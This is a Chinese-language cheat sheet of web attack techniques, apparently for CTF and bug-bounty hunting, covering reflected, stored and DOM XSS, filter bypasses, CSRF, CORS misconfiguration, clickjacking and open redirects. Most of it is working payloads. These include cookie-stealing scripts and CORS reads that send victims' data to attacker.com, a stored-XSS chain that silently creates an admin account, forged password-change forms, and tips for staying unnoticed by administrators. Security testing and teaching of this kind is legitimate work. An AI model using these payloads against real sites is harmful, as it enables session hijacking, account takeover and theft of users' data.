# xss|XSS 与前端安全|🎭

## [g-basic] XSS 基础与类型——掌握三种 XSS 的触发位置与区别，是后续所有利用的起点

### [basic-types] 反射/存储/DOM 三类型对比 | easy | xss;dom-xss;reflected;stored | 反射型;存储型;DOM型
> 同一段注入代码，因为触发位置与存储方式不同，被划分为三种类型，检测与利用思路完全不同。

#### 核心区别

| 维度 | 反射型 XSS | 存储型 XSS | DOM XSS |
|---|---|---|---|
| 注入位置 | URL 参数/表单数据 | 服务器数据库（评论、昵称等） | 前端 JS 读取的 source（location、hash） |
| 触发时机 | 请求即刻回显，一次请求一次触发 | 任意用户访问被污染页面即触发 | 客户端脚本处理数据时在 sink 触发 |
| 受害者来源 | 需要诱导点击恶意链接 | 被动中招，无需点击 | 需要诱导打开含恶意 hash/参数链接 |
| 是否经过服务器 | 是（拼接进响应） | 是（存储后拼接） | 否，纯客户端 |
| 典型场景 | 搜索框、错误提示、参数回显 | 留言板、昵称、富文本 | SPA 路由、读 location.hash 渲染 |

#### 判断要点
- 反射型：payload 出现在响应体中且未编码 → 找闭合点即可利用。
- 存储型：payload 在服务端持久化，二次访问仍存在 → 危害最大，可打管理员。
- DOM 型：响应体中**看不到** payload（服务器不参与拼接）→ 必须看前端 JS 的 source/sink 链。

> [!tip]
> 检测顺序建议：先看响应体是否回显（反射/存储），再抓包看是否落到数据库，最后才用浏览器控制台分析前端 JS 的 DOM 流向。反射型往往最容易验证，先跑通闭环再升级思路。

### [basic-detect-payloads] 检测 payload 全集 | easy | xss;payload;detect | 测试payload;验证payload
> 用最小的无害 payload 证实注入点存在，再用替换字符定位过滤规则，是 XSS 挖掘的标准节奏。

#### 最小弹窗 payload（验证执行）
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
三者覆盖最常见的过滤缺漏：`<script>` 被过滤时换事件触发，标签被黑名单时换 `svg`。

#### 盗 cookie 最小 payload
```javascript
<img src=x onerror="document.location='http://attacker.com/?c='+document.cookie">
```
> [!warn]
> 部分浏览器 HttpOnly 会拦截 `document.cookie` 读取。取不到 cookie 时可转向窃取页面内容、键盘记录或冒充用户操作（CSRF 前置）。

#### 字符探测集（确认过滤规则）
```text
< > " ' / \ ( ) ; = javascript alert onerror
```
逐个测试哪些字符被编码/删除，据此选择绕过路径。

> [!tip]
> 用 `"><svg/onload=alert(1)>` 这种"预闭合"payload 可同时探测引号与尖括号的过滤状态，一次请求顶多次。

### [basic-contexts] 闭合场景速查 | medium | xss;context;payload | 闭合;上下文
> 注入点落在标签内、属性内、注释内还是 script 里，决定了 payload 的结构，先判定上下文再写 payload。

#### 四种上下文与对应 payload

| 上下文 | 示例回显 | payload 思路 | 标准 payload |
|---|---|---|---|
| HTML 标签间 | `<div>INJECT</div>` | 直接插入新标签 | `<script>alert(1)</script>` |
| 双引号属性 | `<input value="INJECT">` | 闭合引号再闭合标签 | `"><svg onload=alert(1)>` |
| 单引号属性 | `<input value='INJECT'>` | 闭合单引号 | `'onmouseover='alert(1)` |
| 注释内 | `<!-- INJECT -->` | 先闭合注释 | `--><script>alert(1)</script>` |
| script 内 | `var x = 'INJECT';` | 闭合字符串与语句 | `';alert(1);//` |

#### 无引号属性场景
属性值本身无引号包裹（`<input value=INJECT>`）时：
```html
value=INJECT onmouseover=alert(1) x=y
```
空格即分隔符，直接追加事件属性。

> [!tip]
> 判定优先级：先看前后各 50 字符的包裹情况，确定最近闭合字符是 `>` 还是引号；属性上下文优先尝试事件属性（无需闭合标签），标签上下文优先新标签。
> 构造 payload 的通用公式：**闭合符 + 注入本体 + 注释/引号收尾**。

## [g-reflected] 反射型 XSS 挖掘——参数进响应即反射，挖掘核心是定位拼接点与闭合上下文

### [ref-context-close] 上下文确认与闭合构造 | medium | xss;reflected;context | 反射闭合
> 反射型 XSS 的灵魂是"参数原样出现在响应体"，用正则式思维找出回显位置外层包裹，逐层闭合。

#### 定位回显点
```http
GET /search?q=test123 HTTP/1.1
Host: target.com
```
响应中检索 `test123`，查看被包裹的 HTML 结构，这是判定上下文的第一步。

#### 逐层闭合模板
```html
<!-- 场景：<h1>SEARCH: q</h1> -->
"...><svg onload=alert(document.domain)>"

<!-- 场景：<input name="kw" value="q"> -->
"><svg onload=alert(1)>"

<!-- 场景：<a href="result?q=q"> -->
" onclick="alert(1)
```

> [!danger]
> 反射点在 URL 内（如 `href="?url=INJECT"`）时，空格与引号会被 URL 编码，先确认服务端是否解码回显。解码后才考虑 `javascript:` 伪协议，否则 URL 编码层已天然阻断。

### [ref-attr-javascript-url] 属性注入与 javascript: URL | easy | xss;attribute;javascript;url | href注入;伪协议
> 当注入点落在可点击属性（href/src/action）内，可以用伪协议直接执行脚本，也可用事件属性触发。

#### javascript: 伪协议
```html
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
```

#### 事件属性（无需点击标签本身）
```html
<input value="x" onfocus=alert(1) autofocus>
<a href="x" onmouseover="alert(1)">hover</a>
<img src="x" onerror="alert(1)">
```

> [!tip]
> 现代浏览器对 `<iframe src=javascript:>` 已收窄，优先用事件属性与 `<a>`。若服务端过滤 `javascript:`，尝试大小写/HTML 实体/`\u006a` JS 转义变体绕过（见 g-bypass）。

### [ref-payload-templates] 常用 payload 模板库 | easy | xss;payload;template | payload模板
> 一套可复用的 payload 模板，覆盖标签、属性、事件、svg 四种触发形态，验证时按过滤情况替换使用。

#### 标签类
```html
<script>alert(1)</script>
<script src="//attacker.com/x.js"></script>
```
#### 属性闭合类
```html
"><img src=x onerror=alert(1)>
'><svg onload=alert(1)>
" autofocus onfocus=alert(1) x="
```
#### svg 与标签变体
```html
<svg/onload=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
```
#### 无引号/标签截断类
```html
<svg/onload=alert(1)//
<img src=x onerror=alert(1)//
```
`//` 用于注释掉后续字符，防尾部修复逻辑（如补引号）。

> [!warn]
> CTF 与真实站点差异：真实站点需假设 WAF 存在，先在本地用相同 payload 对目标做字符级探测再发包；CTF 无 WAF 时直接一把梭。

## [g-stored] 存储型 XSS——payload 持久化在服务端，一次注入多次触发，可波及所有访问者包括管理员

### [stored-storage-points] 存储点枚举 | medium | xss;stored;injection-point | 存储点
> 任何"用户输入 - 服务端保存 - 其他页面渲染"的链路都是存储型 XSS 候选点，先枚举存储点再逐点测试。

#### 高价值存储点清单

| 存储点 | 渲染场景 | 测试方式 |
|---|---|---|
| 留言/评论/弹幕 | 详情页、列表页 | 提交带 payload 的评论后刷新 |
| 昵称/签名/头像名 | 用户主页、评论区作者栏 | 改昵称后访问任意含该用户的页面 |
| 富文本编辑器 | 文章、工单、公告 | 切源码模式直接插入 HTML |
| 附件文件名 | 下载链接、列表页 | 上传含 payload 的文件名 |
| 参数回显字段 | 个人资料、地址、备注 | 逐字段填写探测 payload |

#### 富文本场景注意
富文本会经白名单过滤（如 DOMPurify），直接注入标签往往无效。
```html
<!-- 富文本常见缺口：受信任标签内嵌属性 -->
<img src=x onerror=alert(1)>   <!-- DOMPurify 默认拦截 -->
<a href="javascript:alert(1)">x</a>  <!-- 部分版本漏过滤 -->
<svg><animate onbegin=alert(1)>
```
> [!warn]
> 存 payload 前先确认渲染接口（接口返回的是 HTML 还是转义文本）。只转义 `<>` 的接口即使存储成功也不触发，应结合 DOM XSS 思路找前端二次拼接点。

### [stored-cookie-steal] 窃取 cookie 完整利用链 | medium | xss;cookie;exploit;beef | 盗cookie
> 从注入 payload 到数据回传的完整闭环，包含外带通道与落地接收脚本。

#### Payload 实战模板
```html
<script>
new Image().src='//attacker.com/c?u='+encodeURIComponent(location.href)+'&c='+document.cookie;
</script>
```
或极短事件版：
```html
<img src=x onerror="fetch('//attacker.com/c?c='+document.cookie)">
```
> [!tip]
> 用 `new Image()` 比 `location='...'` 更隐蔽：不发新页面不弹窗，仅发起一个图片请求，日志量小不易被管理员察觉。CSP 严格时无外部请求，改用页面内按键记录（keylogger）或 DOM 篡改。

#### 接收端（attacker.com/c 日志文件）
```txt
2025-01-01 10:00:01 /c?u=https://target.com/admin&c=sessionid=abc123;token=xyz
```

#### 完整利用链
```txt
管理员登录 -> 查看含 payload 的页面 -> payload 发请求到 attacker 服务器
    -> 服务器记录 cookie -> 攻击者用 cookie 重放登录 -> 获取管理员权限
```

> [!danger]
> 仅窃取 HttpOnly 之外的 cookie。若 session cookie 带 HttpOnly，转用"以受害者身份发请求"（通过被注入页面内的 fetch/XHR 调用后台接口），本质是 CSRF+XSS 混合利用。

### [stored-hit-admin] 打管理员思路 | hard | xss;stored;admin;csrf | 打管理员
> 存储型 XSS 的最大收益是"守株待兔"攻击管理员，前置条件是管理员会访问被污染页面，核心思路是把 XSS 升级成 CSRF 链路。

#### 三种打法

| 打法 | 原理 | 适用场景 |
|---|---|---|
| 直接盗 cookie | 管理员 cookie 无 HttpOnly | 管理员与普通用户同域 |
| CSRF 链 | 携 cookie 请求管理接口改配置 | 后台功能有 token 但被同源绕过 |
| BeEF/钓鱼钩子 | 控制管理员浏览器持续操作 | 需要长期驻留、后续利用 |

#### CSRF 链 payload（创建管理员账号示例）
```html
<script>
fetch('/admin/user/add',{method:'POST',
 headers:{'Content-Type':'application/json'},
 body:JSON.stringify({user:'hacker',role:'admin'})}).then(r=>{
 location='http://attacker.com/finish';
});
</script>
```
> [!warn]
> 管理员会话 token 若在 cookie 中且接口同源（同 host 同端口），fetch 会**自动携带**，无需手动读取，这绕开了 HttpOnly。若接口要求 CSRF token，需先在页面内读取 token 字段再带上（见 g-csrf 的 token 泄露一节）。

#### 触发条件核对清单
- 管理员头像/昵称渲染在后台页面（存储点可见）
- 后台页面无 CSP 或 CSP 允许同源脚本
- 管理操作接口同源且无 Origin 校验

> [!tip]
> 打管理员前先自己注册两个账号互测，确认 payload 在"非管理页面"也触发，避免管理员视角页面结构不同导致 payload 失效。

## [g-dom] DOM XSS——纯客户端漏洞，服务器响应里看不到 payload，审计重点在前端 JS 的 source 到 sink 数据流

### [dom-source-sink] source/sink 对照表 | medium | dom-xss;source;sink | DOM型漏洞点
> DOM XSS 成立的条件是一条可控数据从 source 流入危险 sink，先建立映射表再逐条审计。

#### 常见 source（数据入口）
```javascript
location.href / location.search / location.hash
document.URL / document.referrer / document.cookie
window.name / postMessage 数据 / history.state
```
#### 危险 sink（执行/写入点）
```javascript
document.write()          // 直接写 HTML
element.innerHTML = ...   // 解析 HTML
element.outerHTML = ...
document.createElement + 属性拼接后塞入
eval() / setTimeout("str") / setInterval("str")
new Function("str")
location.href = ...  / location.assign() / location.replace()
element.src / .href 赋值（javascript: 变体）
```

#### 流水线对照速查

| Source | Sink | 典型漏洞代码 |
|---|---|---|
| `location.hash` | `innerHTML` | `el.innerHTML = location.hash.slice(1)` |
| `location.search` | `document.write` | `document.write('<a href="'+q+'">')` |
| `location.hash` | `eval` | `eval(location.hash.slice(1))` |
| `document.referrer` | `location.href` | `location.href = referrer`（开放重定向/DOM XSS） |
| `postMessage` | `innerHTML` | `window.onmessage = e => el.innerHTML = e.data` |

> [!tip]
> 审计代码搜索关键词：`innerHTML` `document.write` `eval(` `location.` 与 `postMessage` 的 addEventListener。命中后反向追踪赋值来源是否可控，即完成一次 DOM XSS 判定。
> 判定铁律：**响应体无 payload，但同一 payload 在浏览器内执行** = DOM XSS。

### [dom-framework-pits] 框架渲染坑（vue/react） | hard | dom-xss;vue;react;framework | v-html;dangerouslySetInnerHTML
> 现代框架默认转义文本，但显式开启"渲染原始 HTML"的 API 就是 DOM XSS 高危点，CTF 和 SRC 都是重灾区。

#### Vue 的 v-html
```html
<div v-html="userContent"></div>
```
```vue
<!-- 等价写法，同样危险 -->
<div v-html="location.hash.slice(1)"></div>
```
> [!danger]
> `v-html` 直接插入原始 HTML，完全跳过 Vue 的转义。来源是接口数据或 location 参数时即存储型/DOM XSS。Vue 模板插值 `{{ }}` 和 `v-text` 自动转义，安全。

#### React 的 dangerouslySetInnerHTML
```jsx
<div dangerouslySetInnerHTML={{ __html: props.comment }} />
```
与 Vue 同理，`{children}` 插值默认安全，唯独这个属性跳过转义。

#### 框架其他坑
```jsx
// 危险：属性值包含事件
<a href={userLink}>x</a>   // userLink="javascript:alert(1)" 可触发
// 危险：跳转函数
window.open(userInput)     // 与框架无关，常见于 SPA 路由跳转
```
> [!tip]
> 审计清单：全文检索 `v-html`、`dangerouslySetInnerHTML`、`document.write`、`innerHTML`、`window.open`、`location.href =` 六个关键词，逐个上游追踪。模板引擎（如 Angular `[innerHTML]`）同理。

## [g-bypass] 绕过技巧——过滤不是终点，编码、事件、标签变体与截断是四大绕过方向，配合使用几乎通杀常见黑名单

### [bypass-encoding] 编码绕过 | medium | xss;bypass;encoding | 实体编码;URL编码
> 浏览器在解析 HTML 时会逐层解码，利用"服务端对码过滤、浏览器解码后执行"的差异即可绕过一次过滤。

#### 三层编码总览

| 层 | 编码形式 | 示例 | 解码时机 |
|---|---|---|---|
| HTML 实体 | `&lt; &gt; &#60; &#x3c;` | `&#60;img src=x onerror=alert(1)&#62;` | HTML 解析器 |
| URL | `%3C` `%22` | `%3Cscript%3E` | URL 解码后进参数 |
| JS | `\x3c \u003c` | `\u0061lert(1)` | JS 字符串解析 |

#### 典型组合绕过
```html
<!-- 服务端过滤 <;> 字符时 -->
<img src=x onerror=&#97;lert(1)>

<!-- 服务端过滤 javascript: 关键字时（HTML 实体版） -->
<a href="jav&#x61;script:alert(1)">x</a>

<!-- JS 编码混淆（过滤 alert 时） -->
<img src=x onerror="eval('\x61lert(1)')">
```
> [!warn]
> 编码只在**能被浏览器解码的那个层**有效。例如 `javascript:` 的 HTML 实体只在 `href` 属性内被解析为协议；放在事件属性值里是 JS 上下文，需要用 `\u006a` 形式的 JS 转义。先确认注入上下文再选编码层。

### [bypass-events] 事件属性大全表 | medium | xss;bypass;events | 事件表
> 事件属性是黑名单时代的主力绕过面：标签能换成无数变体，事件却总有一款没被过滤，且多数事件无需用户交互。

#### 自动触发型（零交互）
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```
#### 交互触发型（诱导/钓鱼用）
```html
<a href="#" onclick=alert(1)>点我</a>
<div onmouseover=alert(1)>悬停</div>
<input onkeydown=alert(1)>
<iframe onload=alert(1)>
```
#### 事件性质对照

| 性质 | 事件 | 场景 |
|---|---|---|
| 资源加载失败 | onerror | img/svg/video 必触发 |
| 页面/元素加载完成 | onload/onpageshow | body/svg/iframe |
| 聚焦 | onfocus/autofocus | input/a |
| 鼠标 | onmouseover/onmousedown | 悬停/点击 |
| 键盘 | onkeydown/onkeyup | 输入框 |
| 切换 | ontoggle | details 默认 open |

> [!tip]
> 组合式绕过：`<details open ontoggle>` 与 `<input autofocus onfocus>` 不依赖外部资源加载，在禁用图片的网络环境依然触发，优先使用。

### [bypass-blacklist-len] 黑名单绕过与长度截断 | hard | xss;bypass;blacklist;length | 黑名单绕过;短payload
> 黑名单无法穷尽 HTML 语法的组合空间，大小写、标签变体、空白符、无引号属性与短 payload 是五大常规突破口。

#### 大小写与标签变体
```html
<ScRiPt>alert(1)</sCrIpT>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)
```
#### 空白符替换（正则 `\son\s*=` 常漏制表符/换行）
```html
<img src=x
onerror=alert(1)>
<img src=x	onerror=alert(1)>
```
#### 无引号属性 + 属性截断
```html
<img src=x onerror=alert(1) x=>
<input value=x onfocus=alert(1) autofocus>
```
#### 长度受限场景（如昵称限 20 字符）
```html
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>   <!-- 17 字符内 -->
<svg onload=alert(1)>
```
超短版：`<svg onload=eval(name)>`，把完整载荷放进 `window.name`。

> [!danger]
> 截断型利用（`<img src=x onerror=alert(1) x=` 尾部被服务端截断成"被截断属性"）依赖"服务端截断"行为，每个站点截断长度不同，需先实测回显长度再设计 payload。

> [!tip]
> 通用对抗顺序：测原始 payload → 逐个字符探测过滤项 → 按 编码 → 事件 → 变体 → 截断 的顺序逐层升级，直到某一层绕过。

## [g-csrf] CSRF——利用浏览器自动携带 cookie 的机制，诱导目标以受害者身份提交请求，核心是找到无 token 校验的写操作

### [csrf-principle] 原理与前提 | easy | csrf;principle;cookie | CSRF原理
> 只要目标站点的写操作仅靠 cookie 鉴权，攻击者就能用一张页面替受害者完成该操作，一切前提围绕"浏览器自动带 cookie"。

#### 成立三前提
1. 目标请求**仅凭 cookie 鉴权**，无自定义头/无 token
2. 受害者浏览器存在目标域有效 cookie
3. 攻击者能构造出与目标请求等价的跨站请求（form 无同源限制）

#### 攻击链路
```txt
受害者已登录 target.com (cookie 有效)
    -> 诱导访问 attacker.com/evil.html
    -> evil.html 里的 form/图片自动向 target.com 发请求
    -> 浏览器自动携带 target.com 的 cookie
    -> 服务器认为是受害者本人操作 -> 状态被修改
```

> [!tip]
> 现代浏览器默认 SameSite=Lax，跨站 POST 大多被阻断；但**同站子域**、SameSite=None + Secure、以及老站点直接裸 cookie 的场景依然可行（见 g-csrf-samesite 一节）。
> 判定速查：抓目标写操作请求，看是否带自定义头（如 `X-Requested-With`）或 body 内 token。两者皆无 → 大概率可直接 CSRF。

### [csrf-payload-templates] GET/POST 表单模板 | easy | csrf;payload;form | CSRF模板
> 最稳的 CSRF 载体是纯 HTML form（跨域不受同源策略限制），伪装成普通页面即可诱导提交。

#### GET 型（参数在 URL，用 img 无感触发）
```html
<img src="https://target.com/user/delete?id=123">
```
#### POST 型（form 自动提交，隐蔽性差但最可靠）
```html
<html><body>
<form action="https://target.com/change/password" method="POST" id="f">
  <input type="hidden" name="newpass" value="hacked123">
  <input type="hidden" name="confirm" value="hacked123">
</form>
<script>document.getElementById('f').submit()</script>
</body></html>
```
#### JSON 型（Content-Type 校验缺失时）
```html
<form action="https://target.com/api/user" method="POST"
      enctype="text/plain">
<input type="hidden" name='{"role":"admin","x":"' value='"}'>
</form>
```
> [!warn]
> text/plain 的 JSON 注入依赖服务端对 Content-Type 不敏感（少见）。常规优先 form+POST。判断方法：目标接口是否校验 `Content-Type: application/json`，多数框架不校验 → form 直接可用。

> [!tip]
> 检测思路：用自己的账号抓任意"改数据"请求，去掉一切自定义头后用 form 重放；成功即证明 CSRF 成立，无需等到攻击阶段。

### [csrf-token-bypass-samesite] token 绕过与 SameSite 简述 | hard | csrf;token;samesite | token绕过;SameSite
> 有 token 不等于安全，token 在 GET/响应体/跨域读取中泄露、双提交与同源判断缺陷都是经典绕法；SameSite 则是现代浏览器默认防线。

#### token 泄露路径
```text
1. token 出现在 URL 参数（Referer 会外泄）
2. token 在 localStorage 且被同源 XSS/开放重定向读取
3. JSONP/开放 CORS 接口可跨域读取含 token 的响应
4. token 嵌入响应头且与表单分离
```
#### 双提交缺陷
部分站点在 cookie 存一份 token、表单带一份，只比对两者相等：
```html
<form action="https://target.com/pay" method="POST">
  <input type="hidden" name="csrf" value="attacker_token">
</form>
<!-- 若服务端同时接受 cookie 里的 token，攻击者自己设同名 cookie 即可过校验 -->
<script>document.cookie='csrf=attacker_token'</script>
```
> [!warn]
> 在 attacker.com 上设置 `csrf` cookie 后，跨站请求会**同时携带该 cookie**。若服务端逻辑是"请求 token 与 cookie token 相等即通过"，双提交即被绕过。

#### 同源判断缺陷
- 只校验 `Referer` 前缀/包含 → 用子域或 `http://target.com.attacker.com` 触发
- 校验 Origin 白名单但允许 `null` → 用 sandbox iframe / data: 页面发起

#### SameSite 速查

| 值 | 行为 | 可利用性 |
|---|---|---|
| 未设置（Lax 默认） | 跨站顶层导航 GET 带 cookie，POST 不带 | GET 型 CSRF 仍可行 |
| Strict | 跨站一律不带 | 不可直接 CSRF |
| None + Secure | 全带（需 HTTPS） | 完全可利用 |
| SameSite=Lax + 同站子域 | 子域间视为同站 | 需先拿下子域 |

> [!tip]
> 现代靶场与 CTF 多模拟"无 SameSite"或"Lax + GET 操作"的旧站配置；真实 SRC 中 SameSite=Lax 是常见默认，此时优先看目标是否有 GET 型写操作或可用子域。

## [g-cors] CORS 与点击劫持——错误的跨域配置让接口可被读取，iframe 覆盖让点击被劫持，两类都是"配置即漏洞"

### [cors-aca-reflect] ACAO 反射与利用链 | medium | cors;aca;data-theft | CORS配置错误
> 站点若把 `Access-Control-Allow-Origin` 直接反射请求 Origin，攻击者就能用 JS 跨域读取接口数据（含用户信息），性质等同读取型漏洞。

#### 漏洞判定
```http
GET /api/userinfo HTTP/1.1
Origin: https://evil.com
-->
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
反射 + Credentials=true 即高危组合。仅反射 ACAO 无 Credentials 时只能读公开数据，价值低。

#### 利用链（读接口数据）
```html
<script>
fetch('https://target.com/api/me', {credentials:'include'})
  .then(r=>r.json())
  .then(d=>new Image().src='//attacker.com/?d='+JSON.stringify(d));
</script>
```
> [!warn]
> `credentials:'include'` 是跨域携带 cookie 的关键，缺了它读不到登录态数据。浏览器默认跨域 fetch 不带 cookie。

#### 预检 preflight 注意事项
当请求带非简单头或 JSON body 时，浏览器先发 OPTIONS 预检：
```http
OPTIONS /api/me HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
-->
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: content-type
```
预检通过后浏览器才发正式请求；判断漏洞时**也要测 OPTIONS 是否反射 Origin**。

> [!tip]
> 只反射 Origin 但无 `Allow-Credentials` 的站，可改用 token 类凭据（Authorization 头、localStorage）验证，GitHub 模式：白名单外反射、但配合 token 头仍可读。

### [cors-clickjacking] 点击劫持 iframe 覆盖 | easy | clickjacking;iframe;x-frame-options | 点击劫持
> 站点未配置 `X-Frame-Options` / CSP `frame-ancestors` 时，攻击者把目标页面套进透明 iframe，用户点击的其实是目标页上的按钮。

#### 基础覆盖利用
```html
<html><body>
<style>iframe{opacity:0.01;position:absolute;top:0;left:0}</style>
<iframe src="https://target.com/delete-account" width="500" height="500"></iframe>
<button style="position:absolute;top:200px;left:100px">点我抽奖</button>
</body></html>
```
用户看到的按钮实际对准 iframe 内的删除按钮 → 一次点击完成危险操作。

#### 判定语句
```http
HTTP/1.1 200 OK
```
- 响应头无 `X-Frame-Options` 且无 CSP `frame-ancestors` → 可被嵌
- 有 `X-Frame-Options: SAMEORIGIN`/`DENY` 或 CSP `frame-ancestors 'self'` → 不可嵌

#### 配合技巧
- 多 iframe + 指针轨迹校准（拖拽选择攻击，drag-and-drop clickjacking）
- iframe 内用 `onload` 读取 `document.domain` 一致性（同域可进一步操作）

> [!danger]
> 点击劫持绕过 X-Frame-Options 的经典手段是 `X-Frame-Options` 与 `frame-ancestors` 不一致或使用 `allow-from` 参数（已被废弃但部分老浏览器支持）。防护正确姿势：CSP `frame-ancestors 'none'` + `X-Frame-Options: DENY` 双写。

> [!tip]
> CTF 中点击劫持常与 CSRF 组合命题：IFRAME 内先完成 token 读取等步骤（同源页面），再骗取点击提交，绕过 token 校验。

## [g-redirect] 开放重定向与跳转——跳转参数未校验目标即开放重定向，可被用于钓鱼、token 泄露与 XSS 升级，常被低估

### [redirect-param-find] 跳转参数挖掘 | easy | redirect;parameter;param | 跳转参数
> 先找到"哪些参数决定跳转去向"，再判断是否校验了协议/域名。登录、登出、支付回跳、第三方回调都是重灾区。

#### 常见参数名
```txt
url redirect next target return next_url jump go u dest
redirect_url redirect_uri callback continue retUrl
```
#### 挖掘思路
1. 抓登录/登出/SSO 回跳请求，看 URL 里回跳参数（如 `?redirect=https://app.com/dashboard`）
2. 修改参数为目标域名 → 观察是否整站跳转
3. 若跳转，试 `http://attacker.com`、`//attacker.com`、`https://attacker.com`、`https://target.com.attacker.com`

> [!warn]
> 只放行同域前缀但允许"包含关系"的校验是经典缺陷：`https://target.com.attacker.com` 与 `https://attacker.com?u=https://target.com` 经常能绕过"必须以 target.com 开头"的正则。

### [redirect-pseudo-protocol] 伪协议与 javascript: 变体 | hard | redirect;javascript;xss;protocol | 伪协议
> 跳转参数若未限制协议，`javascript:` 直接把开放重定向升级为同源 XSS；`data:` 也是一条协议层面的绕过路径。

#### javascript: 直接利用
```html
https://target.com/redirect?url=javascript:alert(document.domain)
```
触发点是 `<a href>`、`location.href`、`window.open` 渲染返回值时。

#### 协议变体
```html
JaVaScRiPt:alert(1)
javascript&#58;alert(1)        <!-- HTML 实体 -->
javascript&colon;alert(1)
&#0000106;avascript:alert(1)   <!-- 十进制实体 -->
\ud6a5cript:alert(1)           <!-- JS 转义（window.open/location.赋值场景）-->
```
#### 判定与升级
```txt
仅允许 http/https 的跳转参数 -> 开放重定向（钓鱼/凭据窃取）
允许 javascript: 的跳转参数 -> 直接 XSS（同源，危害翻倍）
```
> [!danger]
> 判定铁律：跳转参数驱动 `location.href`/`window.open` 且未校验协议时，必然同时测试 `javascript:`；即便服务端只放行 http(s)，若前端代码是 `location.href = 'https://' + param`，仍可尝试 `/attacker.com` 配合 `\` 或 `@` 混淆。

### [redirect-harm-upgrade] 危害升级与组合利用 | medium | redirect;phishing;token;xss | 重定向危害
> 开放重定向自身通常不评高危，但叠加钓鱼、token 泄露与 XSS 后可升级为认证绕过或会话劫持，报告价值随之上升。

#### 三条升级路径

| 升级方向 | 原理 | 示例 |
|---|---|---|
| 钓鱼 | 跳转到与目标相似的伪造页 | `target.com/login?redirect=https://target.com.evil.net/phish` |
| token 泄露 | 回调 URL 带一次性 code/token，跳转后随 Referer/参数外泄 | OAuth `redirect_uri` 校验缺陷 + 跳转 |
| XSS 升级 | 跳转参数可带 javascript: 或拼接进 DOM | `url=javascript:alert(1)` |

#### OAuth/SSO 回跳泄露示例
```txt
登录流程: target 授权 -> 302 到 redirect_uri?code=xxxx
错误校验: 只比对 redirect_uri 前缀/允许通配 -> 
攻击: redirect_uri=https://attacker.com/cb+target.com 形式的混淆
     或先传合法 redirect_uri 拿 code, 再用开放重定向把 code 带出去
```
#### 与 XSS 组合的最小陷阱
```html
<!-- 有开放重定向 + 任一一处 XSS/CSRF 时 -->
<script>location='https://target.com/logout?redirect=//attacker.com/phish'</script>
```

> [!tip]
> 报告时按链式危害描述：开放重定向（低）→ token 泄露/钓鱼（中高）→ 与 XSS 组合成会话劫持（高）。CTF 中"跳转参数 + javascript:"命题最常见，先测协议再测域名，一把梭。

> [!warn]
> 仅 `http(s)` 放开时代：如果服务端有 `url` 参数二次跳转链路（跳转再跳转），可串联两次开放重定向绕过域名白名单，最终逃逸。